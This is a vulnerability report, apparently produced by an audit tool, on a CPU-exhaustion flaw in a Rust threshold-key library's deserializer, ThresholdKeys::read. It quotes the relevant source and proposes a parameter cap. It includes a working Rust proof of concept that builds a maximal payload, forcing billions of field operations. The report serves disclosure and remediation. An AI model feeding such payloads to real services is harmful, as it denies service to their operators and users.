### Title
Quadratic Lagrange interpolation enables CPU exhaustion through `ThresholdKeys::read` - ([File: crypto/dkg/src/lib.rs])

### Summary

`ThresholdKeys::read` accepts attacker-controlled threshold parameters, then calls `ThresholdKeys::new`, which performs Lagrange interpolation for each of the first `t` participants. Each interpolation factor scans all `t` included participants and performs a scalar inversion, producing `Θ(t²)` scalar multiplication work and `Θ(t)` inversions. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description

The deserializer reads `t`, `n`, and the local participant index directly from the input, permits Lagrange interpolation with tag `1`, reads `n` public verification shares, and then invokes `ThresholdKeys::new`. [1](#0-0) 

For Lagrange interpolation, `ThresholdKeys::new` creates the participant set `1..=t` and calls `interpolation_factor` once for every participant in that set. [3](#0-2) 

Each `interpolation_factor` call iterates over the entire `t`-element `included` set, performing two scalar multiplications per other participant and one scalar inversion at the end. [4](#0-3) 

Because `n` and `t` are `u16`, an input can specify `t = n = 65,535` while carrying only one scalar and `65,535` encoded verification shares. [5](#0-4) [6](#0-5) 

That payload causes approximately `2 * 65,535 * 65,534` scalar multiplications and `65,535` scalar inversions during deserialization, before any signature verification or signing operation occurs. [7](#0-6) [3](#0-2) 

### Impact Explanation

An unprivileged party who can submit bytes to `ThresholdKeys::read` can make a worker execute billions of field operations from a serialized object only a few megabytes long. [1](#0-0) [2](#0-1) 

Because the expensive work happens inside `ThresholdKeys::new`, merely loading the untrusted threshold-key encoding is sufficient to consume disproportionate CPU. [8](#0-7) 

Repeated submissions can keep deserialization workers occupied and deny service to other operations handled by the same process. [3](#0-2) 

### Likelihood Explanation

The attacker controls `t`, `n`, the interpolation variant, the secret-share encoding, and every verification-share encoding in the serialized input. [6](#0-5) 

All `n` verification shares may encode the same valid generator because the map key is the sequential `Participant`, not the point value, so the payload does not require any expensive cryptographic construction. [9](#0-8) 

The attack reaches its maximum practical cost at the protocol’s `u16` parameter boundary and requires no malformed point encodings, invalid participant index, hash collision, or privileged state. [5](#0-4) [10](#0-9) 

### Recommendation

Enforce an application-appropriate maximum `n`/`t` before reading `n` shares or calling `ThresholdKeys::new` on untrusted input. [1](#0-0) 

If large thresholds must remain supported, calculate Lagrange coefficients with a bounded-cost or caller-authorized path and reject oversized deserialized parameters rather than performing `Θ(t²)` interpolation unconditionally. [2](#0-1) [11](#0-10) 

### Proof of Concept

```rust
use ciphersuite::{
  group::{ff::PrimeField, GroupEncoding},
  Ciphersuite,
};
use dkg::{Participant, ThresholdKeys};

fn trigger<C: Ciphersuite>() {
  let t = u16::MAX;
  let n = u16::MAX;
  let i = Participant::new(1).unwrap();

  let mut bytes = Vec::new();
  bytes.extend_from_slice(&(C::ID.len() as u32).to_le_bytes());
  bytes.extend_from_slice(C::ID);
  bytes.extend_from_slice(&t.to_le_bytes());
  bytes.extend_from_slice(&n.to_le_bytes());
  bytes.extend_from_slice(&i.to_bytes());

  // Interpolation::Lagrange.
  bytes.push(1);

  // secret_share.
  bytes.extend_from_slice(C::F::ONE.to_repr().as_ref());

  // n syntactically valid verification shares.
  let point = C::generator().to_bytes();
  for _ in 0..n {
    bytes.extend_from_slice(point.as_ref());
  }

  // Performs roughly 8.6 billion scalar multiplications and 65,535 inversions.
  let _ = ThresholdKeys::<C>::read(&mut bytes.as_slice());
}
```

This encoding passes parameter validation with `t = n = 65,535` and `i = 1`, selects Lagrange interpolation, supplies one scalar plus `65,535` canonical points, and reaches the nested interpolation in `ThresholdKeys::new`. [1](#0-0) [12](#0-11)

### Citations

**File:** crypto/dkg/src/lib.rs (L166-179)
```rust
  pub const fn new(t: u16, n: u16, i: Participant) -> Result<ThresholdParams, DkgError> {
    if (t == 0) || (n == 0) {
      return Err(DkgError::ZeroParameter { t, n });
    }

    if t > n {
      return Err(DkgError::InvalidThreshold { t, n });
    }
    if i.0 > n {
      return Err(DkgError::InvalidParticipant { n, participant: i });
    }

    Ok(ThresholdParams { t, n, i })
  }
```

**File:** crypto/dkg/src/lib.rs (L226-247)
```rust
  fn interpolation_factor(&self, i: Participant, included: &[Participant]) -> F {
    match self {
      Interpolation::Constant(c) => c[usize::from(u16::from(i) - 1)],
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
      }
```

**File:** crypto/dkg/src/lib.rs (L355-379)
```rust
    if verification_shares.len() != usize::from(params.n()) {
      Err(DkgError::IncorrectAmountOfVerificationShares {
        n: params.n(),
        shares: verification_shares.len(),
      })?;
    }
    for participant in verification_shares.keys().copied() {
      if u16::from(participant) > params.n() {
        Err(DkgError::InvalidParticipant { n: params.n(), participant })?;
      }
    }

    match &interpolation {
      Interpolation::Constant(_) => {
        if params.t() != params.n() {
          Err(DkgError::InapplicableInterpolation("constant interpolation for keys where t != n"))?;
        }
      }
      Interpolation::Lagrange => {}
    }

    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();

```

**File:** crypto/dkg/src/lib.rs (L591-631)
```rust
    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```
